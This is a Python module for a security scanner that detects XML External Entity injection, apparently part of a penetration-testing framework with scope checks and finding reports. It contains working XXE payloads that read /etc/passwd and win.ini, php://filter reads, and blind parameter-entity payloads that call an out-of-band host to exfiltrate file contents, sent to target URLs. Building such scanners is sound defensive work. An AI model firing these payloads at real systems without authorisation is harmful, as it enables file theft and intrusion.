"""
XXEScanner — XML External Entity injection detection with OOB confirmation.

Lifecycle:
  DETECTED:   (not applicable)
  VALIDATED:  In-band or error-based XXE returns file content
  EXPLOITABLE: (not applicable)
  VERIFIED:   OOB callback confirms blind XXE execution

Covers:
  - In-band XXE (file read via entity)
  - Error-based XXE (file content via parser error)
  - Blind / OOB XXE (parameter entity + DTD)
  - SVG XXE (via SVG upload with onload and external entities)
  - XInclude (xi:include when DOCTYPE is blocked)
  - SOAP / XML-RPC XXE
  - Multiple Content-Type variants (application/xml, text/xml, etc.)

Maturity: Level 4 (OOB-confirmed)
"""

from modules.utils import (
    safe_post, finding, log, Colors, _build_curl,
    VerificationStage,
    safe_cookies_dict, safe_get,
)
from scanners.base import ScannerBase, DetectionResult, ValidationResult
from models.finding import Finding
from models.evidence import HttpRequestEvidence, ResponseExcerptEvidence
from urllib.parse import urljoin

XXE_PAYLOADS = {
    "in_band": [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>',
    ],
    "error_based": [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///nonexist">%xxe;]><root>test</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root>&xxe;</root>',
    ],
    "oob": [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://{oob}/xxe">%xxe;]><root>test</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "ftp://{oob}/xxe">%xxe;]><root>test</root>',
    ],
    "blind": [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://{oob}/xxe.dtd">%dtd;]><root>&send;</root>',
    ],
    "svg": [
        '<?xml version="1.0" standalone="yes"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg width="128" height="128" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><text font-size="16" x="0" y="16">&xxe;</text></svg>',
        '<?xml version="1.0" standalone="yes"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><svg width="128" height="128" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><text font-size="16" x="0" y="16">&xxe;</text></svg>',
        '<?xml version="1.0" standalone="yes"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><svg width="128" height="128" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><text font-size="16" x="0" y="16">&xxe;</text></svg>',
    ],
    "xinclude": [
        '<?xml version="1.0"?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>',
        '<?xml version="1.0"?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///c:/windows/win.ini" parse="text"/></root>',
    ],
    "soap": [
        '<?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>',
        '<?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>',
    ],
}

XXE_SIGNATURES = [
    "root:x:0:0", "[extensions]", "[fonts]", "[boot loader]",
    "for 16-bit app support", "daemon:x:", "bin:x:",
    "www-data:x:", "ROOT", "Administrator",
    "nobody:x:", "mail:x:", "sys:x:",
]

SVG_UPLOAD_EXTENSIONS = [".svg", ".svgz", ".xml"]

SOAP_ACTIONS = [
    "", "urn:xxe-test", "http://tempuri.org/xxe",
]

CONTENT_TYPE_VARIANTS = [
    "application/xml",
    "text/xml",
    "application/xml; charset=utf-8",
    "text/xml; charset=utf-8",
]


class XXEScanner(ScannerBase):
    SCANNER_NAME = "xxe"
    SCANNER_MATURITY = 4
    TARGET_LEVEL = False

    def __init__(self, config: dict, recon: dict, container=None):
        super().__init__(config, recon, container=container)
        self._oob_registrations: list[tuple[str, str, str]] = []

    # ── Payload dispatch ────────────────────────────────────────────────

    def _test_payload_group(self, url: str, payloads: list[str],
                            group_name: str,
                            content_type: str = "application/xml",
                            soap_action: str | None = None,
                            extra_headers: dict | None = None) -> DetectionResult | None:
        """Send a group of XXE payloads and return first detection match."""
        for payload in payloads:
            try:
                headers = {"Content-Type": content_type}
                if soap_action is not None:
                    headers["SOAPAction"] = soap_action
                if extra_headers:
                    headers.update(extra_headers)
                resp = safe_post(self.session, url, payload, self.timeout, headers=headers)
                if not resp:
                    continue
                body = resp.text
                for sig in XXE_SIGNATURES:
                    if sig in body:
                        return DetectionResult(
                            url=url,
                            parameter="POST body",
                            payload=payload,
                            context=f"{group_name}:{sig}",
                            raw_response=resp,
                            evidence_signals=[f"{group_name}:{sig}"],
                        )
            except Exception:
                continue
        return None

    def _test_svg_upload(self, url: str, payloads: list[str]) -> DetectionResult | None:
        """Try SVG upload via multipart form-data."""
        for payload in payloads:
            try:
                files = {"file": ("xxe_test.svg", payload, "image/svg+xml")}
                resp = safe_post(self.session, url, None, files=files, timeout=self.timeout)
                if not resp:
                    continue
                body = resp.text
                for sig in XXE_SIGNATURES:
                    if sig in body:
                        return DetectionResult(
                            url=url,
                            parameter="file upload (SVG)",
                            payload=payload,
                            context=f"svg_upload:{sig}",
                            raw_response=resp,
                            evidence_signals=[f"svg_upload:{sig}"],
                        )
            except Exception:
                continue
        return None

    # ── Detection phase ─────────────────────────────────────────────────

    def detect(self, url: str, parameter: str | None = None) -> DetectionResult | None:
        xxe_payloads = self._load_payloads("xxe")
        content_types = CONTENT_TYPE_VARIANTS

        # ── In-band (multiple Content-Type variants) ──────────────────
        for ct in content_types:
            result = self._test_payload_group(
                url, xxe_payloads.get("in_band", XXE_PAYLOADS["in_band"]),
                "in_band", content_type=ct,
            )
            if result:
                return result

        # ── Error-based ───────────────────────────────────────────────
        result = self._test_payload_group(
            url, xxe_payloads.get("error_based", XXE_PAYLOADS["error_based"]),
            "error",
        )
        if result:
            return result

        # ── XInclude (bypasses DOCTYPE restrictions) ──────────────────
        result = self._test_payload_group(
            url, xxe_payloads.get("xinclude", XXE_PAYLOADS["xinclude"]),
            "xinclude",
        )
        if result:
            return result

        # ── SVG upload if URL looks like an upload endpoint ───────────
        if any(ext in url.lower() for ext in SVG_UPLOAD_EXTENSIONS):
            result = self._test_svg_upload(
                url, xxe_payloads.get("svg", XXE_PAYLOADS["svg"]),
            )
            if result:
                return result

        # ── SOAP/XML-RPC ──────────────────────────────────────────────
        for action in SOAP_ACTIONS:
            result = self._test_payload_group(
                url, xxe_payloads.get("soap", XXE_PAYLOADS["soap"]),
                "soap", soap_action=action,
            )
            if result:
                return result

        return None

    def validate(self, detection: DetectionResult) -> ValidationResult | None:
        from scanners.base import ValidationResult
        return ValidationResult(
            confirmed=True,
            signals=detection.evidence_signals,
            method=detection.context.split(":")[0],
            detail=detection.context,
        )

    def collect_evidence(self, detection: DetectionResult,
                         validation_result: ValidationResult | None = None) -> list:
        ev_list = []
        resp = detection.raw_response
        if resp:
            req_ev = HttpRequestEvidence(
                method="POST",
                url=detection.url,
                curl_command=_build_curl("POST", detection.url, dict(self.session.headers), data=detection.payload, cookies=safe_cookies_dict(self.session.cookies)),
            )
            resp_ev = ResponseExcerptEvidence(
                excerpt=resp.text[:500],
                length=len(resp.text),
                context="xxe_detection",
            )
            ev_list.extend([req_ev, resp_ev])
        return ev_list

    def generate_reproduction(self, detection: DetectionResult,
                              validation_result: ValidationResult | None = None) -> list[str]:
        group = detection.context.split(":")[0] if ":" in detection.context else "unknown"
        sig = detection.context.split(":")[1] if ":" in detection.context and len(detection.context.split(":")) > 1 else detection.context

        steps_map = {
            "in_band": [
                f"Send POST request to {detection.url} with Content-Type: application/xml and an XXE payload containing an external entity",
                f"Observe in response: {sig!r} — file content returned from server-side entity resolution",
                "This confirms the XML parser processes external entities without restriction",
            ],
            "error": [
                f"Send POST request to {detection.url} with a malformed XXE payload that causes the parser to leak file content in error messages",
                f"Observe in response: {sig!r} — file content leaked via parser error",
                "This confirms error-based XXE is possible",
            ],
            "xinclude": [
                f"Send POST request to {detection.url} with an XInclude payload referencing a local file",
                f"Observe in response: {sig!r} — file content included via XInclude",
                "XInclude bypasses DOCTYPE restrictions — server processes <xi:include> even when DOCTYPE is blocked",
            ],
            "svg_upload": [
                f"Upload an SVG file to {detection.url} containing an XXE payload with an external entity",
                f"Observe in response: {sig!r} — file content returned in the rendered SVG",
                "This confirms SVG XXE — the SVG parser processes external entities",
            ],
            "soap": [
                f"Send SOAP request to {detection.url} with SOAPAction header and an XXE payload in the SOAP body",
                f"Observe in response: {sig!r} — file content returned via SOAP XML entity",
                "This confirms XXE in SOAP/XML-RPC endpoint",
            ],
        }
        return steps_map.get(group, [
            f"Send POST request to {detection.url} with XXE payload",
            f"Observe in response: {sig!r}",
            "This confirms XXE is possible",
        ])

    # ── Scan entry point ────────────────────────────────────────────────

    def scan(self, target_urls: list[str] | None = None) -> list[Finding]:
        self._prepare_scan()
        oob_host = self.validation.callback_host if self.validation else ""
        urls = self.recon.get("urls", []) if target_urls is None else target_urls
        xxe_payloads = self._load_payloads("xxe")

        for url in urls:
            if not self._in_scope(url):
                continue
            signals = {"in_band": False, "error": False, "svg_upload": False,
                       "xinclude": False, "soap": False}

            detection = self.detect(url)
            if detection is not None:
                validation_result = self.validate(detection)
                evidence_list = self.collect_evidence(detection, validation_result)
                group = detection.context.split(":")[0]
                is_error = group == "error"
                if group in signals:
                    signals[group] = True

                for ev in evidence_list:
                    self.evidence_engine.store(ev)

                group_labels = {
                    "in_band": "In-band",
                    "error": "Error-based",
                    "xinclude": "XInclude",
                    "svg_upload": "SVG Upload",
                    "soap": "SOAP",
                }
                label = group_labels.get(group, group)

                f = finding(
                    vuln_type="XML External Entity (XXE) Injection",
                    url=url, severity="critical",
                    details=f"{label} XXE: file content returned via XML entity",
                    evidence=f"Signature: {detection.evidence_signals[0] if detection.evidence_signals else ''}",
                    request=_build_curl("POST", url, dict(self.session.headers), data=detection.payload, cookies=safe_cookies_dict(self.session.cookies)),
                    response_excerpt=detection.raw_response.text[:500] if detection.raw_response else "",
                    steps_to_reproduce=self.generate_reproduction(detection, validation_result),
                    verification_stage=VerificationStage.VALIDATED.value,
                )
                if f:
                    for ev in evidence_list:
                        self.evidence_engine.link_to_finding(ev, f.get("fingerprint", ""))
                    self._enrich_finding(f, len(evidence_list), f["verification_stage"])
                    self._add_finding(f)
                log(f"  [XXE{' Error' if is_error else ''} {label}] {url}", Colors.RED, verbose_only=True, verbose=self.verbose)

            if oob_host and not any(signals.values()):
                for payload in xxe_payloads.get("oob", XXE_PAYLOADS.get("oob", [])):
                    try:
                        formatted = payload.replace("{oob}", self.validation.callback_host) if self.validation else payload.replace("{oob}", "x.oob")
                        safe_post(self.session, url, formatted, self.timeout, headers={"Content-Type": "application/xml"}, raise_for_status=False)
                        self.validation.register_oob("xxe", formatted, url)
                        self._oob_registrations.append(("xxe", formatted, url))
                    except Exception:
                        continue

        return self._get_findings()

    def finalize(self) -> list[Finding]:
        extra: list[dict] = []
        if not self.validation:
            return extra
        confirmed = self.validation.poll_oob()
        for ev in confirmed:
            payload_str = ev.callback_host or ""
            url_str = ""
            for vt, pl, u in self._oob_registrations:
                if payload_str and payload_str in pl:
                    url_str = u
                    break
            f = finding(
                vuln_type="XML External Entity (XXE) Injection",
                url=url_str,
                severity="critical",
                details="Blind XXE confirmed via OOB callback — server parsed XML entity and made external request",
                evidence=f"Callback: {(ev.raw_data or '')[:200]}",
                request=_build_curl("POST", url_str, dict(self.session.headers), data="(XXE payload with OOB DTD)", cookies=safe_cookies_dict(self.session.cookies)),
                verification_stage=VerificationStage.VERIFIED.value,
                response_excerpt="(XXE confirmed via out-of-band callback — XML parser made external request)",
                steps_to_reproduce=[
                    f"Send POST request to {url_str} with Content-Type: application/xml and an OOB XXE payload pointing to an attacker-controlled host",
                    "Observe OOB callback — the XML parser made an external request, confirming blind XXE",
                    f"Escalate: use XXE to read local files via parameter entities (file:///etc/passwd) or SSRF to internal services",
                ],
            )
            if f:
                self.evidence_engine.store(ev)
                self.evidence_engine.link_to_finding(ev, f.get("fingerprint", ""))
                self._enrich_finding(f, 1, f["verification_stage"])
                self._add_finding(f)
                extra.append(f)
            log(f"  [XXE OOB] {url_str}", Colors.RED, verbose_only=True, verbose=self.verbose)
        return extra
